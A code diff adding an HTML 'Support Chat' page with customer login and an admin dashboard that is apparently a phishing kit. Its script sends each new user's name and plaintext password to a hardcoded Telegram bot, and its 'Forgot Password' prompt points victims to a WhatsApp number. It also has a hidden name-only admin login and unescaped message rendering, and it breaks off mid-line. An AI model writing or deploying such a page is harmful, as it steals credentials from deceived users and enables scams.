@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title id="siteTitle">Support Chat | Admin Dashboard</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<style>
+/* Global Bold Setting */
+* { font-weight: bold !important; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+
+:root {
+  --primary: #2563eb;
+  --primary-hover: #1d4ed8;
+  --bg-light: #f8fafc;
+  --text-dark: #1e293b;
+  --text-muted: #64748b;
+  --white: #ffffff;
+  --border: #e2e8f0;
+  --chat-bg: #e5ddd5;
+  --msg-user: #dcf8c6;
+  --msg-admin: #ffffff;
+  --sidebar-bg: #1e293b;
+  --sidebar-header: #0f172a;
+  --sidebar-hover: #334155;
+  --sidebar-text: #f1f5f9;
+  --unread-bg: #ef4444;
+}
+
+body { margin: 0; background: var(--bg-light); color: var(--text-dark); }
+
+/* Profile Icon Styling */
+.profile-icon {
+    width: 38px;
+    height: 38px;
+    border-radius: 50%;
+    overflow: hidden;
+    border: 2px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #fff;
+    flex-shrink: 0;
+}
+.profile-icon img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+/* Admin List Profile Icons */
+.admin-user-icon {
+    width: 32px;
+    height: 32px;
+    background: var(--primary);
+    color: white;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-right: 12px;
+    font-size: 14px;
+    text-transform: uppercase;
+}
+
+.login {
+  height: 100vh; display: flex; flex-direction: column;
+  justify-content: center; align-items: center; 
+  background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), 
+              url('https://files.catbox.moe/v2w24h.jpg') no-repeat center center;
+  background-size: cover;
+}
+
+.login-card {
+  background: rgba(255, 255, 255, 0.9);
+  backdrop-filter: blur(5px);
+  padding: 2.5rem; border-radius: 12px;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4); 
+  width: 100%; max-width: 400px; text-align: center;
+}
+
+.unread-badge {
+  background: var(--unread-bg);
+  color: white; font-size: 11px; padding: 2px 7px;
+  border-radius: 10px; margin-left: auto; display: inline-block;
+  min-width: 18px; text-align: center;
+}
+
+#forgotPassAd {
+  position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
+  background: #333; color: white; padding: 15px 25px; border-radius: 8px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.3); z-index: 1000;
+  width: 90%; max-width: 450px; text-align: center; font-size: 14px;
+  transition: top 0.5s ease-in-out; border-left: 5px solid #25d366;
+}
+#forgotPassAd.show { top: 20px; }
+
+.login h2 { margin-top: 0; color: var(--primary); }
+.login input { 
+  padding: 12px 16px; width: 100%; margin-bottom: 12px; border: 1px solid var(--border); 
+  border-radius: 8px; outline: none; transition: border 0.2s; font-size: 14px;
+}
+
+.password-wrapper { position: relative; width: 100%; }
+.password-wrapper i {
+  position: absolute; right: 15px; top: 14px;
+  color: var(--text-muted); cursor: pointer; font-size: 16px;
+}
+
+.login button {
+  padding: 12px; width: 100%; background: var(--primary); color: white; 
+  border: none; border-radius: 8px; cursor: pointer; transition: 0.2s; margin-top: 5px;
+}
+
+.forgot-link {
+  display: block; margin-top: 15px; font-size: 13px; color: var(--primary);
+  text-decoration: none; cursor: pointer;
+}
+
+.error-msg { color: #ef4444; font-size: 13px; margin-top: 10px; height: 15px; }
+
+.container { display: flex; height: 100vh; overflow: hidden; }
+
+.users { 
+  width: 320px; background: var(--sidebar-bg); 
+  border-right: 1px solid var(--sidebar-header); 
+  display: flex; flex-direction: column; color: var(--sidebar-text);
+}
+.users-header { 
+  padding: 20px; background: var(--sidebar-header);
+  border-bottom: 1px solid rgba(255,255,255,0.1); font-size: 1.1rem;
+}
+.user-list-item {
+  padding: 12px 20px; border-bottom: 1px solid rgba(255,255,255,0.05); 
+  cursor: pointer; display: flex; align-items: center; transition: 0.2s;
+}
+.user-list-item.active { background: var(--primary); border-left: 5px solid #60a5fa; color: white; }
+
+.delete-user { color: #94a3b8; padding: 5px; opacity: 0.6; margin-left: 10px; }
+.delete-user:hover { color: #ef4444; opacity: 1; }
+
+.chat { flex: 1; display: flex; flex-direction: column; background: var(--white); }
+.chat-header { 
+    padding: 12px 24px; background: var(--white); border-bottom: 1px solid var(--border); 
+    display: flex; align-items: center; justify-content: space-between; z-index: 10;
+}
+.messages { 
+    flex: 1; padding: 24px; overflow-y: auto; 
+    background-color: var(--chat-bg);
+    background-image: url("https://www.transparenttextures.com/patterns/cubes.png");
+}
+.message { 
+    max-width: 75%; padding: 8px 12px; margin-bottom: 8px; 
+    border-radius: 8px; font-size: 14.5px; position: relative; line-height: 1.4;
+    box-shadow: 0 1px 0.5px rgba(0,0,0,0.13);
+}
+.user-bubble { background: var(--msg-user); color: #303030; margin-left: auto; border-top-right-radius: 0; }
+.admin-bubble { background: var(--msg-admin); color: #303030; border-top-left-radius: 0; }
+
+.chat-image { max-width: 100%; border-radius: 5px; margin-top: 5px; cursor: pointer; display: block; }
+
+.time { font-size: 10px; margin-top: 4px; opacity: 0.5; text-align: right; display: block; }
+.delete-msg { cursor: pointer; font-size: 14px; margin-left: 10px; opacity: 0.2; float: right; }
+.delete-msg:hover { opacity: 1; color: #ef4444; }
+
+.input-area { padding: 12px 20px; background: #f0f2f5; display: flex; gap: 12px; align-items: center; }
+.input-area input[type="text"] { 
+    flex: 1; padding: 10px 18px; border: none; border-radius: 20px; 
+    outline: none; background: white; font-size: 15px;
+}
+.input-area button, .camera-label { 
+    background: var(--primary); color: white; border: none; 
+    width: 40px; height: 40px; border-radius: 50%; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+}
+.camera-label { background: #64748b; font-size: 18px; }
+
+#previewModal {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0,0,0,0.85); display: none; 
+    flex-direction: column; align-items: center; justify-content: center; z-index: 2000;
+}
+.preview-content { background: white; padding: 20px; border-radius: 12px; max-width: 90%; text-align: center; }
+.preview-content img { max-width: 100%; max-height: 60vh; border-radius: 8px; border: 1px solid #ddd; }
+.preview-btns { margin-top: 15px; display: flex; gap: 10px; justify-content: center; }
+.btn-send { background: #22c55e; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+.btn-cancel { background: #ef4444; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+
+.back-btn { background: none; border: 1px solid var(--border); padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 12px; }
+.hidden { display: none !important; }
+
+@media(max-width: 700px) { .users { width: 80px; } .users span { display: none; } .admin-user-icon { margin-right: 0; } }
+</style>
+</head>
+<body>
+
+<div id="previewModal">
+    <div class="preview-content">
+        <h3 style="margin-top:0; color: #333;">Confirm Send Image</h3>
+        <img id="imgPreviewTarget" src="" alt="Preview">
+        <div class="preview-btns">
+            <button class="btn-send" onclick="confirmSendImage()"><i class="fa-solid fa-paper-plane"></i> Send Now</button>
+            <button class="btn-cancel" onclick="closePreview()">Cancel</button>
+        </div>
+    </div>
+</div>
+
+<div id="forgotPassAd">
+    <i class="fa-brands fa-whatsapp" style="color: #25d366; margin-right: 8px;"></i>
+    please contact <b>+278782628-747</b> on Whatsapp to get your details or password
+</div>
+
+<div class="login" id="login">
+  <div class="login-card">
+      <h2 style="color: #2563eb;">Support Chat</h2>
+      <p style="color: #333; font-size: 14px; margin-bottom: 20px;">Identity verification required</p>
+      <input type="text" id="nameInput" placeholder="Your Name">
+      
+      <div id="pwdContainer" class="hidden">
+        <div class="password-wrapper">
+          <input type="password" id="passwordInput" placeholder="Password">
+          <i class="fa-solid fa-eye-slash" id="togglePassword"></i>
+        </div>
+      </div>
+
+      <button onclick="login()">Continue</button>
+      <a class="forgot-link" onclick="showForgotAd()">Forgot Password?</a>
+      <p id="loginMsg" class="error-msg"></p>
+  </div>
+</div>
+
+<div class="container hidden" id="adminPanel">
+  <div class="users">
+    <div class="users-header">Active Customers</div>
+    <div id="userList"></div>
+  </div>
+  <div class="chat">
+    <div class="chat-header">
+      <span id="chatHeader">Select a customer</span>
+      <button class="back-btn" onclick="logout()">Logout</button>
+    </div>
+    <div class="messages" id="messages"></div>
+    <div class="input-area">
+      <label class="camera-label"><i class="fa-solid fa-camera"></i><input type="file" id="adminFile" class="hidden" accept="image/*" onchange="previewAdminImage(this)"></label>
+      <input type="text" id="messageInput" placeholder="Reply...">
+      <button onclick="sendAdminMessage()"><i class="fa-solid fa-paper-plane"></i></button>
+    </div>
+  </div>
+</div>
+
+<div class="container hidden" id="customerPanel">
+  <div class="chat">
+    <div class="chat-header">
+        <div style="display: flex; align-items: center; gap: 12px;">
+            <div class="profile-icon">
+                <img src="https://ui-avatars.com/api/?name=Support&background=2563eb&color=fff" alt="Support">
+            </div>
+            <div style="display: flex; flex-direction: column;">
+                <div style="display: flex; align-items: center; gap: 6px;">
+                    <div style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%;"></div>
+                    <h4 style="margin:0">Live Support</h4>
+                </div>
+                <span style="font-size: 10px; color: var(--text-muted); font-weight: normal !important;">Online</span>
+            </div>
+        </div>
+        <button class="back-btn" onclick="logout()">Logout</button>
+    </div>
+    <div class="messages" id="customerMessages"></div>
+    <div class="input-area">
+      <label class="camera-label"><i class="fa-solid fa-camera"></i><input type="file" id="customerFile" class="hidden" accept="image/*" onchange="sendCustomerImage(this)"></label>
+      <input type="text" id="customerInput" placeholder="Type a message">
+      <button onclick="sendCustomerMessage()"><i class="fa-solid fa-paper-plane"></i></button>
+    </div>
+  </div>
+</div>
+
+<script>
+const TELEGRAM_BOT_TOKEN = '8557391650:AAFMcTDp0I8uXxCV4TGZZyjYWHwAKTcqxFQ';
+const TELEGRAM_CHAT_ID = '8419125080';
+const notificationSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
+
+let currentUser = "";
+let selectedUser = "";
+let pendingImageData = "";
+
+const getUsers = () => JSON.parse(localStorage.getItem("users") || "{}");
+const saveUsers = (u) => localStorage.setItem("users", JSON.stringify(u));
+const getChats = () => JSON.parse(localStorage.getItem("chats") || "{}");
+const saveChats = (c) => localStorage.setItem("chats", JSON.stringify(c));
+
+async function sendToTelegram(message) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+  try { await fetch(url); } catch (error) { console.error("Telegram Error:", error); }
+}
+
+function showForgotAd() {
+    const ad = document.getElementById("forgotPassAd");
+    ad.classList.add("show");
+    setTimeout(() => { ad.classList.remove("show"); }, 3000);
+}
+
+document.querySelector('#togglePassword').addEventListener('click', function() {
+    const pwdInput = document.querySelector('#passwordInput');
+    this.classList.toggle('fa-eye-slash');
+    this.classList.toggle('fa-eye');
+    pwdInput.type = pwdInput.type === 'password' ? 'text' : 'password';
+});
+
+function login() {
+  const name = document.getElementById("nameInput").value.trim();
+  const pass = document.getElementById("passwordInput").value;
+  const msg = document.getElementById("loginMsg");
+  const pwdContainer = document.getElementById("pwdContainer");
+  
+  if (!name) return;
+
+  if (name.toLowerCase() === "akwan") {
+    document.getElementById("login").classList.add("hidden");
+    document.getElementById("adminPanel").classList.remove("hidden");
+    loadUsers();
+    return;
+  }
+
+  if (pwdContainer.classList.contains("hidden")) {
+    pwdContainer.classList.remove("hidden");
+    msg.textContent = "Please enter/create a password";
+    msg.style.color = "var(--primary)";
+    return;
+  }
+
+  const users = getUsers();
+  if (!users[name]) {
+    if (!pass) { msg.textContent = "Password required"; msg.style.color = "red"; return; }
+    users[name] = { password: pass };
+    saveUsers(users);
+
+    const chats = getChats();
+    chats[name] = [{
+        from: "admin", 
+        text: `Hello ${name}, welcome to our Live Support! How can we help you today?`, 
+        time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}),
+        read: false 
+    }];
+    saveChats(chats);
+
+    sendToTelegram(`🆕 NEW REGISTRATION\n👤 User: ${name}\n🔑 Pass: ${pass}`);
+  } else {
+    if (users[name].password !== pass) { 
+        msg.textContent = "Incorrect password"; 
+        msg.style.color = "red"; 
+        return; 
+    }
+  }
+
+  currentUser = name;
+  document.getElementById("login").classList.add("hidden");
+  document.getElementById("customerPanel").classList.remove("hidden");
+  loadCustomerMessages();
+}
+
+function logout() {
+  if (!confirm("Are you sure you want to log out?")) return;
+  currentUser = ""; selectedUser = "";
+  document.getElementById("adminPanel").classList.add("hidden");
+  document.getElementById("customerPanel").classList.add("hidden");
+  document.getElementById("login").classList.remove("hidden");
+  document.getElementById("nameInput").value = "";
+  document.getElementById("passwordInput").value = "";
+  document.getElementById("pwdContainer").classList.add("hidden");
+  document.getElementById("loginMsg").textContent = "";
+}
+
+function sendCustomerImage(input) {
+    if (!input.files || !input.files[0]) return;
+    const reader = new FileReader();
+    reader.onload = function(e) {
+        const chats = getChats();
+        chats[currentUser].push({
+            from: "user",
+            text: "",
+            image: e.target.result,
+            time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}),
+            read: false
+        });
+        saveChats(chats);
+        loadCustomerMessages();
+    };
+    reader.readAsDataURL(input.files[0]);
+}
+
+function previewAdminImage(input) {
+    if (!selectedUser) { alert("Please select a user first"); return; }
+    if (!input.files || !input.files[0]) return;
+    const reader = new FileReader();
+    reader.onload = function(e) {
+        pendingImageData = e.target.result;
+        document.getElementById("imgPreviewTarget").src = pendingImageData;
+        document.getElementById("previewModal").style.display = "flex";
+    };
+    reader.readAsDataURL(input.files[0]);
+}
+
+function confirmSendImage() {
+    const chats = getChats();
+    chats[selectedUser].push({
+        from: "admin",
+        text: "",
+        image: pendingImageData,
+        time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}),
+        read: true
+    });
+    saveChats(chats);
+    closePreview();
+    loadAdminMessages();
+}
+
+function closePreview() {
+    document.getElementById("previewModal").style.display = "none";
+    document.getElementById("adminFile").value = "";
+    pendingImageData = "";
+}
+
+function sendCustomerMessage() {
+  const input = document.getElementById("customerInput");
+  if (!input.value.trim()) return;
+  const chats = getChats();
+  chats[currentUser] = chats[currentUser] || [];
+  chats[currentUser].push({ 
+    from: "user", text: input.value, 
+    time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}),
+    read: false 
+  });
+  saveChats(chats);
+  notificationSound.play();
+  input.value = "";
+  loadCustomerMessages();
+}
+
+function loadCustomerMessages() {
+  const chats = getChats();
+  const box = document.getElementById("customerMessages");
+  box.innerHTML = "";
+  (chats[currentUser] || []).forEach(m => {
+    const div = document.createElement("div");
+    div.className = "message " + (m.from === "user" ? "user-bubble" : "admin-bubble");
+    let content = m.text ? `<div>${m.text}</div>` : `<img src="${m.image}" class="chat-image">`;
+    div.innerHTML = `${content}<span class="time">${m.time}</span>`;
+    box.appendChild(div);
+  });
+  box.scrollTop = box.scrollHeight;
+}
+
+function loadUsers() {
+  const chats = getChats();
+  const list = document.getElementById("userList");
+  list.innerHTML = "";
+  let totalUnread = 0;
+  Object.keys(chats).forEach(name => {
+    const unreadCount = chats[name].filter(m => m.from === "user" && m.read === false).length;
+    totalUnread += unreadCount;
+    const badgeHtml = unreadCount > 0 ? `<span class="unread-badge">${unreadCount}</span>` : "";
+    
+    // Initial for profile icon
+    const initial = name.charAt(0);
+
+    const div = document.createElement("div");
+    div.className = "user-list-item" + (selectedUser === name ? " active" : "");
+    div.innerHTML = `<div onclick="openChat('${name}')" style="flex:1; display:flex; align-items:center;">
+                        <div class="admin-user-icon">${initial}</div>
+                        <span>${name}</span>
+                        ${badgeHtml}
+                     </div>
+                     <span class="delete-user" onclick="deleteCustomer('${name}')">✕</span>`;
+    list.appendChild(div);
+  });
+  document.title = totalUnread > 0 ? `(${totalUnread}) Support Chat` : "Support Chat | Admin Dashboard";
+}
+
+function openChat(name) {
+  selectedUser = name;
+  const chats = getChats();
+  if (chats[name]) {
+    chats[name].forEach(m => { if(m.from === "user") m.read = true; });
+    saveChats(chats);
+  }
+  document.getElementById("chatHeader").textContent = "Chatting with " + name;
+  loadUsers();
+  loadAdminMessages();
+}
+
+function loadAdminMessages() {
+  const chats = getChats();
+  const box = document.getElementById("messages");
+  box.innerHTML = "";
+  if (!selectedUser || !chats[selectedUser]) return;
+  chats[selectedUser].forEach((m, i) => {
+    const div = document.createElement("div");
+    div.className = "message " + (m.from === "admin" ? "user-bubble" : "admin-bubble");
+    let content = m.text ? `<div>${m.text}</div>` : `<img src="${m.image}" class="chat-image">`;
+    div.innerHTML = `<div>${content} <span class="delete-msg" onclick="deleteMessage(${i})">×</span></div>
+                     <span class="time">${m.time}</span>`;
+    box.appendChild(div);
+  });
+  box.scrollTop = box.scrollHeight;
+}
+
+function sendAdminMessage() {
+  if (!selectedUser) return;
+  const input = document.getElementById("messageInput");
+  if (!input.value.trim()) return;
+  const chats = getChats();
+  chats[selectedUser].push({ 
+    from: "admin", text: input.value, 
+    time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}),
+    read: true 
+  });
+  saveChats(chats);
+  input.value = "";
+  loadAdminMessages();
+}
+
+function deleteMessage(i) {
+  const chats = getChats();
+  chats[selectedUser].splice(i, 1);
+  saveChats(chats);
+  loadAdminMessages();
+}
+
+function deleteCustomer(name) {
+  if (!confirm(`Delete all data for ${name}?`)) return;
+  const users = getUsers();
+  const chats = getChats();
+  delete users[name]; delete chats[name];
+  saveUsers(users); saveChats(chats);
+  if (selectedUser === name) { selectedUser = ""; document.getElementById("messages").innerHTML = ""; }
+  loadUsers();
+}
+
+setInterval(() => {
+  if (!documen
